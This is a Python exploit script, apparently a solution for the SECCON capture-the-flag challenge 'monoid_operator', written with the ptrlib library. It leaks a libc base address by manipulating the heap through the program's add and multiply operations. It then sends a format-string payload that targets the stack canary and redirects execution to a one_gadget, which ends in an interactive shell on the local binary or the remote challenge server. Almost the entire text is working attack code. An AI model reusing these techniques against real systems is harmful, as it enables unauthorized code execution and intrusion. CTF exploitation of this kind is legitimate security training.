from ptrlib import *

def add(array):
    sock.sendlineafter("?\n", "+")
    sock.sendlineafter("?\n", str(len(array)))
    sock.recvline()
    for data in array:
        if data is None:
            sock.sendline("+")
        else:
            sock.sendline(str(data))
    sock.recvuntil("is ")
    return int(sock.recvline()[:-1])

def mul(array):
    sock.sendlineafter("?\n", "*")
    sock.sendlineafter("?\n", str(len(array)))
    sock.recvline()
    for data in array:
        if data is None:
            sock.sendline("+")
        else:
            sock.sendline(str(data))
    r = sock.recvuntil("is ")
    if b'Overflow' in r:
        return 0
    return int(sock.recvline()[:-1])

#"""
libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
sock = Process("./monoid_operator_9092cbe0e255da46164bf38851880c1878ad3cbd")
libc_main_arena = 0x3ebc40
one_gadget = 0x10a38c
"""
libc = ELF("./libc.so.6_9bb401974abeef59efcdd0ae35c5fc0ce63d3e7b")
sock = Socket("monoidoperator.chal.seccon.jp", 27182)
libc_main_arena = 0x1e4c40
one_gadget = 0x106ef8
#"""

# libc base
mul([9 for i in range(0x500 // 8)])
libc_base = add([None] + [0 for i in range(0x500 // 8 - 1)]) - libc_main_arena - 96
addr_canary = libc_base + 0x5ed528
logger.info("libc base = " + hex(libc_base))

# fsb
payload  = '%{}c'.format(0x408)
payload += '%11$c'
payload += '%13$s'
payload += bytes2str(p64(libc_base + one_gadget))
sock.sendlineafter("?\n", "q")
sock.sendafter("?\n", p64(addr_canary + 1)[:-1])
sock.sendlineafter("!\n", payload)

sock.interactive()
